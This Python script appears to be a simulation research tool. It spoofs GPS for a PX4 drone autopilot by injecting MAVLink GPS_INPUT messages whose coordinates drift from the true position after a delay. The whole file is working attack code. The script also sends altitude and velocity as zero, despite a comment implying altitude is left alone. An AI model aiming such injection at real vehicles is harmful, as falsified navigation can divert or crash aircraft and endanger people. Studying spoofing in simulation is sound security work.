"""
MAVLink GPS_INPUT Spoofer (for PX4 SITL)
=======================================

Goal
----
Inject spoofed GPS fixes via MAVLink `GPS_INPUT` so PX4 *consumes* the spoofed
coordinates (system-level spoofing), instead of only changing logged CSV values.

Important Notes
--------------
- This requires `pymavlink`:
    pip install pymavlink

- PX4 must be configured to accept MAVLink GPS as a GPS source. In many PX4 SITL
  setups, the simulator already provides GPS; you may need to disable/override
  the simulated GPS or adjust estimator settings so the EKF actually uses the
  injected GPS. If PX4 is still using the simulator GPS, your injection will not
  change the vehicle's belief.

- This script is intentionally standalone: run it in parallel with your flight
  logger/mission script.
"""

import argparse
import math
import time
from dataclasses import dataclass

from pymavlink import mavutil


def meters_to_lat_offset(meters: float) -> float:
    return meters / 111_111.0


def meters_to_lon_offset(meters: float, lat_deg: float) -> float:
    return meters / (111_111.0 * math.cos(math.radians(lat_deg)))


@dataclass
class Drift:
    north_mps: float
    east_mps: float


def make_drift(rate_mps: float, direction_deg: float) -> Drift:
    dir_rad = math.radians(direction_deg)
    return Drift(
        north_mps=rate_mps * math.cos(dir_rad),
        east_mps=rate_mps * math.sin(dir_rad),
    )


def main() -> None:
    p = argparse.ArgumentParser(description="Inject MAVLink GPS_INPUT drift spoof.")
    p.add_argument("--master", default="udp:127.0.0.1:14540", help="MAVLink connection string")
    p.add_argument("--rate-hz", type=float, default=10.0, help="GPS_INPUT send rate")
    p.add_argument("--attack-start", type=float, default=10.0, help="Seconds before spoof starts")
    p.add_argument("--drift-rate-m-per-s", type=float, default=1.5, help="Drift speed (m/s)")
    p.add_argument("--drift-direction-deg", type=float, default=45.0, help="0=north, 90=east")
    p.add_argument("--fix-type", type=int, default=3, help="GPS fix type (3=3D)")
    args = p.parse_args()

    mav = mavutil.mavlink_connection(args.master, autoreconnect=True)
    mav.wait_heartbeat(timeout=15)
    print("[+] Heartbeat received.")

    # Use GLOBAL_POSITION_INT as a convenient "true" reference stream in SITL.
    # Note: this is *fused* position, not raw GPS, but it's stable for a baseline.
    print("[*] Waiting for initial position...")
    msg = mav.recv_match(type="GLOBAL_POSITION_INT", blocking=True, timeout=15)
    if msg is None:
        raise RuntimeError("Timed out waiting for GLOBAL_POSITION_INT.")

    true_lat = msg.lat / 1e7
    true_lon = msg.lon / 1e7
    print(f"[+] Reference lat/lon: {true_lat:.7f}, {true_lon:.7f}")

    drift = make_drift(args.drift_rate_m_per_s, args.drift_direction_deg)
    period = 1.0 / args.rate_hz
    start = time.time()

    print(
        f"[*] Sending GPS_INPUT @ {args.rate_hz:.1f} Hz. "
        f"Attack starts at t={args.attack_start:.1f}s; "
        f"drift={args.drift_rate_m_per_s:.2f} m/s @ {args.drift_direction_deg:.0f}°."
    )

    while True:
        now = time.time()
        elapsed = now - start

        # Update reference periodically (helps if you’re actually moving).
        m = mav.recv_match(type="GLOBAL_POSITION_INT", blocking=False)
        if m is not None:
            true_lat = m.lat / 1e7
            true_lon = m.lon / 1e7

        if elapsed >= args.attack_start:
            t = elapsed - args.attack_start
            off_n = drift.north_mps * t
            off_e = drift.east_mps * t
            lat = true_lat + meters_to_lat_offset(off_n)
            lon = true_lon + meters_to_lon_offset(off_e, true_lat)
            label = "attack"
        else:
            lat = true_lat
            lon = true_lon
            label = "normal"

        # Minimal GPS_INPUT payload; units per MAVLink spec.
        # Many fields are optional; PX4 mainly needs time, lat/lon/alt, vel, sats, fix type.
        # lat/lon in degrees; MAVLink expects (deg * 1e7) for *_int fields but GPS_INPUT uses degrees * 1e7 too.
        time_usec = int(now * 1e6)
        lat_int = int(lat * 1e7)
        lon_int = int(lon * 1e7)

        mav.mav.gps_input_send(
            time_usec,     # time_usec
            0,             # gps_id
            0,             # ignore_flags (0 = use provided fields)
            0,             # time_week_ms
            0,             # time_week
            args.fix_type, # fix_type
            lat_int,       # lat (1e7)
            lon_int,       # lon (1e7)
            0.0,           # alt (m) - left at 0 unless you want to spoof altitude too
            1.0,           # hdop
            1.0,           # vdop
            0.0,           # vn (m/s)
            0.0,           # ve (m/s)
            0.0,           # vd (m/s)
            0.0,           # speed_accuracy (m/s)
            0.0,           # horiz_accuracy (m)
            0.0,           # vert_accuracy (m)
            10,            # satellites_visible
            0,             # yaw (cdeg)
        )

        if int(elapsed) % 5 == 0 and abs((elapsed % 5) - 0.0) < period:
            print(f"[*] {label:6s} t={elapsed:6.1f}s lat={lat:.7f} lon={lon:.7f}")

        time.sleep(period)


if __name__ == "__main__":
    main()

